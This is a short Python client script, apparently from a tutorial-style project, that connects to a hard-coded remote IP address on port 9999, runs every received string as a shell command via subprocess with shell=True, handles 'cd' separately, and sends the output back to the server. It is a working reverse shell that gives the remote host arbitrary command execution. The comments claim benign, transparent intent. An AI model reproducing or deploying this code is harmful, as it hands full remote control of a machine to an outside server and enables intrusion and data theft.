import socket
# os and subprocess libraries needed as they are required to execute instructions received by client machine
import os
import subprocess

s = socket.socket()
# host = "for now, since we don't have our live server setup yet, for testing purposes can use IP address of local host"
host = "167.99.179.219" #This is the static IP address of the server hosted on Digital Ocean. Active as of August 2024
port = 9999

# similar to s.bind however socket is bound on server side, and connect is to actually connect  with the server
s.connect((host,port))

# same concept as for server, infinite while loop to run concurrently
while True:
    # receiveing data (command/message) with a buffer size of 1024 bits
    data = s.recv(1024)

    # now need to do data checks on the file to make sure it is formatted properly in cmd
    # first check is checking for the 'cd' command to change directory
    # basically checking to see if the first two characters of the decoded message is 'cd' or not
    if data[:2].decode("utf-8") == 'cd':
        # now parsing past the 3rd character of decoded message to obtain the path
        # this path is then went into using the chdir function as part of the os library
        # this instruction is used to actually execute the changes on the client's computer
        os.chdir(data[3:].decode("utf-8"))
     # if whatever is written is not the 'cd' command, will handle it accordingly
    if len(data) > 0:
        # Popen will open u cmd and we will put in the command of the whole string (not only after 3rd character)
        # second parameter (shell = True) gives us access to shell commands
        # stdout is the output after we type in a command in command prompt (e.g "hey" output of echo hey)
        # in that case echo hey would be the stdin (input)
        # stderr is standard error which will be given if an invalid shell command is input
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                               stdin=subprocess.PIPE, stderr=subprocess.PIPE)

        # now we need to send the output back to server to see what's happening. outputs are both in byte format and
        # in string format
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8") # utf-8 just standardizes the string

        # Now we need to send this output string to our server

        # Also want to store our current working directory.
        # however getcwd() function doesn't capture the ">" at the start of the line so add that manually
        currentWD = os.getcwd() + "> "
        # can only send bytes over socket connection so have to encode string
        s.send(str.encode(output_str + currentWD))

        # This print function is so the user on client side can see the commands executing on that machine
        # Transparency is required as we are not using this tool for malicious intent
        print(output_str)

